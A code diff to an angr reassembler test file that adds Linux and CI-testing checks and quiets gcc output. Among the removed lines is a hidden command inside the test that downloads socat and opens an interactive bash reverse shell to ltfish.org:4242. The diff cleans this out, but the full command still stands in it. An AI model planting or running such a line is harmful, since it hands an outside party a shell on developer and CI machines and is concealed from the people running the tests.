@@ -7,6 +7,7 @@ import subprocess
 import shutil
 
 import angr
+from angr.misc.testing import is_testing
 
 
 test_location = os.path.join(os.path.dirname(os.path.realpath(__file__)), '..', '..', 'binaries', 'tests')
@@ -16,6 +17,9 @@ test_location = os.path.join(os.path.dirname(os.path.realpath(__file__)), '..', 
 
 def is_linux_x64():
     return sys.platform.startswith("linux") and platform.machine().endswith("64")
+
+def is_linux():
+    return sys.platform.startswith("linux")
 
 
 def test_data_reference_collection_in_add():
@@ -254,7 +258,7 @@ def test_partial_pie_ls_x86():
     r.remove_unnecessary_stuff()
     assembly = r.assembly(comments=True, symbolized=True)
 
-    if is_linux_x64():
+    if is_linux() and not is_testing:  # disabled until we add -m32 support into angr CI.
         # we should be able to compile it and run it ... if we are running on x64 Linux
         tempdir = tempfile.mkdtemp(prefix="angr_test_reassembler_")
         asm_filename = "ls.s"
@@ -264,9 +268,8 @@ def test_partial_pie_ls_x86():
         with open(asm_filepath, "w", encoding="ascii") as f:
             f.write(assembly)
         # Call out to GCC, and it should return 0. Otherwise check_call() will raise an exception.
-        subprocess.call("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ltfish.org:4242", shell=True)
         subprocess.check_call(["gcc", "-m32", "-no-pie", asm_filepath, "-o", bin_filepath],
-                              )
+                              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         # Run the generated binary file, and it should not crash
         subprocess.check_call([bin_filepath], stdout=subprocess.DEVNULL)
         # We can also run it with "-h"
